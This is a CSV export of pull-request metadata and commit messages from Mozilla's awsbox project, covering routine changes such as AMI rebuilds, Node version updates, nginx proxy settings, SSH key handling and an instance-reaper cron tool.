,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
10,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0c1d07c2b133816b986a574506ecfc4bf6ec33d1,doc fix
11,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1a30723e065087bbd2a42f2981ee5cb1d7ce6573,copy up pristinify script to ~ec2-user
12,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,592b4b5829e95ce81cf253f9df56e26f74c3f022,new ami images
13,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,f8e2e4c2b33636a51ad6c7622f19aea2163ac096,nodejs -> v0.10.29
14,https://api.github.com/repos/mozilla/awsbox/pulls/137,137,update to node 0.10.28,"update to current latest nodejs 0.10.x (and since persona now requires nodejs >= 0.10.26, this is needed _now_ to get an awsbox built for persona). @chilts r?
",jrgm,758162,2014-06-04T02:05:27Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,00b1bdfa0bae2e2db2f50bf9f577296a6d876258,update to node 0.10.28
15,https://api.github.com/repos/mozilla/awsbox/pulls/136,136,Fix buffer limits on remote commands,"Fixes https://github.com/mozilla/awsbox/issues/133.
fxa-content-server awsbox deploy is blocked by this. Also 5MB of buffer ought to be enough for anybody.
",vladikoff,128755,2014-06-02T03:18:44Z,CONTRIBUTOR,True,5,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,40cfddd31172477bac128a183a2dd2ce80108508,Fix buffer limits on remote commands
16,https://api.github.com/repos/mozilla/awsbox/pulls/135,135,"set ""proxy_buffering off"" for GH-131 and GH-122","Fixes  GH-131 and GH-122
",jrgm,758162,2014-05-31T02:09:13Z,CONTRIBUTOR,True,2,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2ea14f575456691b3a8661cfd2bf607defaf27de,"set ""proxy_buffering off"" for GH-131 and GH-122"
17,https://api.github.com/repos/mozilla/awsbox/pulls/130,130,write out ver.txt after everything has completed ok,"Seems to work for me. (I don't believe there's any need to write it out temporarily; it should reflect what is successfully built (not what was attempted)).
",jrgm,758162,2014-03-17T05:36:16Z,CONTRIBUTOR,True,7,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b6ef8560c9a08857b1a93db4688a105daa6ccdfe,write out ver.txt after everything has completed ok
18,https://api.github.com/repos/mozilla/awsbox/pulls/130,130,write out ver.txt after everything has completed ok,"Seems to work for me. (I don't believe there's any need to write it out temporarily; it should reflect what is successfully built (not what was attempted)).
",jrgm,758162,2014-03-17T05:36:16Z,CONTRIBUTOR,True,7,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4d4fdde9a2a798949ac963f9cec99e79199954a7,order child_process.exec callback parameters correctly
19,https://api.github.com/repos/mozilla/awsbox/pulls/129,129,Standardise which environment variables we use,"The following tools all use AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY,
so let's use them too:
- aws-cli      : https://github.com/aws/aws-cli#getting-started
- aws-sdk-ruby : http://docs.aws.amazon.com/AWSRubySDK/latest/index.html#Basic_Configuration
- aws-sdk-js   : http://docs.aws.amazon.com/AWSJavaScriptSDK/guide/node-configuring.html#Credentials_from_Environment_Variables
",chilts,3048,2014-03-17T02:18:48Z,CONTRIBUTOR,True,72,37,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,f638a185d3b23500378cb061d43435eca9adca7e,"Standardise which environment variables we use

The following tools all use AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY,
so let's use them too:

* aws-cli      : https://github.com/aws/aws-cli#getting-started
* aws-sdk-ruby : http://docs.aws.amazon.com/AWSRubySDK/latest/index.html#Basic_Configuration
* aws-sdk-js   : http://docs.aws.amazon.com/AWSJavaScriptSDK/guide/node-configuring.html#Credentials_from_Environment_Variables"
20,https://api.github.com/repos/mozilla/awsbox/pulls/125,125,check if dispName is defined first,"I keep hitting this and dying when doing `awsbox list`. /cc @chilts
",jrgm,758162,2014-03-11T18:16:40Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,89c016ec4ac4b8ad5481d1c5ff178e7f9811ffce,check if dispName is defined first
21,https://api.github.com/repos/mozilla/awsbox/pulls/119,119,Support multi-level subdomains within a hosted zone.,"Fixes #118.  @chilts IIRC you did most of the r53 work here, r?
",rfk,34695,2014-02-12T02:36:20Z,MEMBER,True,22,11,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,5d08b3e3f6aab0a948bb5b4b4a8a0eacb8fdefd0,Support multi-level subdomains within a hosted zone.
22,https://api.github.com/repos/mozilla/awsbox/pulls/116,116,Fix documentation for nginx restart,,Standard8,520844,2014-01-24T08:56:15Z,MEMBER,True,2,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b8afddcf21a17c91d9c31b9a8b37985b6b3073aa,Fix documentation for nginx restart
23,https://api.github.com/repos/mozilla/awsbox/pulls/115,115,Allow config.json to supply environment variables as well as via awsbox.json,"config.json is a machine/instance specific file. Using this, we could allow setting of environment variables applicable to the particular deployment.

This is in addition to the project specific env vars in awsbox.json.

This allows greater flexibility for configurations and allows for secrets to not be in the awsbox.json file which is typically checked into repositories.
",Standard8,520844,2013-11-19T11:08:55Z,MEMBER,True,37,21,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,f6dd483ea6e9355be4a76ddb0a3ea2195ec0312d,Allow config.json to supply environment variables as well
24,https://api.github.com/repos/mozilla/awsbox/pulls/111,111,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection,"My current setup is for ELBs to terminate the https connection, but to still need http to redirect to https.

The easiest way I've found to handle this with awsbox is to copy the nginx proxy redirect for the http -> https but then remove the https config, and let the ELB connect to the server on port 10000 (the default port for the server).
",Standard8,520844,2013-10-07T19:42:25Z,MEMBER,True,24,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,c7ec0f3846e18943a93f8bbb0676fae32a55a667,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection
25,https://api.github.com/repos/mozilla/awsbox/pulls/111,111,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection,"My current setup is for ELBs to terminate the https connection, but to still need http to redirect to https.

The easiest way I've found to handle this with awsbox is to copy the nginx proxy redirect for the http -> https but then remove the https config, and let the ELB connect to the server on port 10000 (the default port for the server).
",Standard8,520844,2013-10-07T19:42:25Z,MEMBER,True,24,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2e47e4d58b6a2149a207c374621082f46b9ee275,Improve redirects for ELB termination by handling everything on port 80.
26,https://api.github.com/repos/mozilla/awsbox/pulls/111,111,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection,"My current setup is for ELBs to terminate the https connection, but to still need http to redirect to https.

The easiest way I've found to handle this with awsbox is to copy the nginx proxy redirect for the http -> https but then remove the https config, and let the ELB connect to the server on port 10000 (the default port for the server).
",Standard8,520844,2013-10-07T19:42:25Z,MEMBER,True,24,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ef57f096f4c91eecf0c1e4a0b0d2efb9d7275cdf,Merge branch 'master' into ssl_proxy_fixes
27,https://api.github.com/repos/mozilla/awsbox/pulls/111,111,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection,"My current setup is for ELBs to terminate the https connection, but to still need http to redirect to https.

The easiest way I've found to handle this with awsbox is to copy the nginx proxy redirect for the http -> https but then remove the https config, and let the ELB connect to the server on port 10000 (the default port for the server).
",Standard8,520844,2013-10-07T19:42:25Z,MEMBER,True,24,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0585da9b462ac6ee5aaaf1bf146a3366d0e68654,Fix arguments for moving proxy config files
28,https://api.github.com/repos/mozilla/awsbox/pulls/109,109,ability to claim instances,"This pull requests adds features around claiming instances:
1. create command by default expects AWS_EMAIL to be defined
2. upon instance creation an 'email' tag will be added to the instance
3. `claim` lets you tag an instance with your email
4. `unclaimed` lets you list unclaimed instances.
",lloyd,39411,2013-09-25T09:02:37Z,CONTRIBUTOR,True,47,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,056ab4af93db9df186c1a48a2dd95093d89072b9,add features around claiming instances with email address to help large scale users of awsbox manage their instances better
29,https://api.github.com/repos/mozilla/awsbox/pulls/107,107,multi-region support - issue #21 - issue #105,,lloyd,39411,2013-09-20T09:16:30Z,CONTRIBUTOR,True,170,40,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0334853f64ad8f2811becd36680af4a68f5f1cf1,multi-region support - issue #21 - issue #105
30,https://api.github.com/repos/mozilla/awsbox/pulls/106,106,Add a step to make sure user has an RSA SSH key.,"This is to fix https://github.com/mozilla/awsbox/issues/26 :-)
",vthunder,435972,2013-09-19T18:42:06Z,CONTRIBUTOR,True,8,6,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,5ab5f7231895616ed8337fb7dd5f8ad0717bb8c5,Add a step to make sure user has an RSA SSH key.
31,https://api.github.com/repos/mozilla/awsbox/pulls/103,103,Fix how to get the error when something goes wrong,,chilts,3048,2013-09-18T23:58:47Z,CONTRIBUTOR,False,2,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,6ad7c46f746be24bb270b2c209fc8ba3adcbc9fd,Fix how to get the error when something goes wrong
32,https://api.github.com/repos/mozilla/awsbox/pulls/99,99,Force version of nice-route53 to new 0.3.3,"There was a bug in nice-route53 about updating A records
  https://github.com/chilts/nice-route53/issues/1

@chilts pushed a new version to npmjs.org, but for reasons I don't get, `npm
install awsbox` is installing the previous `0.3.2` version.

So, this change forces the version to `0.3.3` (not `0.3.x`).
",jrgm,758162,2013-09-18T04:13:24Z,CONTRIBUTOR,False,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1883beac107440f6cfbb8d1845c7ffc6b5194680,"There was a bug in nice-route53 about updating A records
  https://github.com/chilts/nice-route53/issues/1

@chilts pushed a new version to npmjs.org, but for reasons I don't get, `npm
install awsbox` is installing the previous `0.3.2` version.

So, this change forces the version to `0.3.3` (not `0.3.x`)."
33,https://api.github.com/repos/mozilla/awsbox/pulls/97,97,Use the err.msg rather than the err object,,chilts,3048,2013-09-18T02:27:33Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,104135d68725f37d5a5676a904018543ebc32ed2,Use the err.msg rather than the err object
34,https://api.github.com/repos/mozilla/awsbox/pulls/96,96,addkey command takes a file or directory,"note, the command line documentation suggests that addkey works this way, however, we never actually implemented it.  I always forget to add keys at instance creation time, so maybe a nice little feature.  @chilts or @jedp - r?
",lloyd,39411,2013-09-17T12:02:11Z,CONTRIBUTOR,True,40,23,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,083b343df518bf1613fb3d7da2a3967e4a9e1f55,addkey command takes a file or directory
35,https://api.github.com/repos/mozilla/awsbox/pulls/96,96,addkey command takes a file or directory,"note, the command line documentation suggests that addkey works this way, however, we never actually implemented it.  I always forget to add keys at instance creation time, so maybe a nice little feature.  @chilts or @jedp - r?
",lloyd,39411,2013-09-17T12:02:11Z,CONTRIBUTOR,True,40,23,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ac02cfa13dbf27f9685bcf25dc49a7e4cbb86cc6,fix exception for non-zero exit code in script
36,https://api.github.com/repos/mozilla/awsbox/pulls/96,96,addkey command takes a file or directory,"note, the command line documentation suggests that addkey works this way, however, we never actually implemented it.  I always forget to add keys at instance creation time, so maybe a nice little feature.  @chilts or @jedp - r?
",lloyd,39411,2013-09-17T12:02:11Z,CONTRIBUTOR,True,40,23,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,a5ec9f970561abe44776d063ae6a3f8bc3757ca2,move 'added' var decl closer to usage
37,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,a362381c09d4def5380b18b957978773e8adde43,#86 improve compatibility with EC2 CLI env. variables
38,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,05f7bfe331143cd3bb406be611b7925fe7930bbb,#86 now usage of other env. variables actually works
39,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,6b6833c858bfe46c9ea3581e069aa57935142dfe,#85 add command to find all EC2 instances tagged with AWSBOX
40,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,9922b6936c879007c2a278391da3449f44b9e6c4,Merge branch '#86-ec2-cli-parity' into #85-reaper
41,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,e6b0d083a52a453d9941388a9b2f4f61c6ddca31,#85 improve filtering of AWSBOX logic
42,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,73f2d490c8ed6726edc868d2ddfa44c7f99c0b1b,add logic stubs for the reaper
43,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,78ab5e92671054a858a026dd114fa96a6a808bd6,rework reaper to keep more state in EC2 tags
